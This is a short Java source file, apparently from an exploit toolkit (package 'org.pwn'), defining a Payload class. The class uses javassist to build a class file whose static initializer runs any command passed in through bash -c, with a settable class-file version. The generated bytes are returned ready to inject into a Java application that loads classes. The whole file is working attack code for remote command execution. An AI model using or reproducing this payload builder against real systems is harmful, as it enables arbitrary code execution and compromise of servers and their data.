package org.pwn;

import javassist.*;
import javassist.bytecode.ClassFile;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

public class Payload {
    public static ByteArrayInputStream build (String command, int version, String className) throws CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass(className);
        String template = "try{" + 
                            "java.lang.Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"%s\"});"+
                          "}catch(Exception e)"+
                          "{System.out.println(e);}";
        cc.makeClassInitializer().insertAfter(String.format(template,command));
        ClassFile ccf = cc.getClassFile();
        ccf.setMajorVersion(version);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ccf.write(new DataOutputStream(bos));
        return new ByteArrayInputStream(bos.toByteArray());
    }
}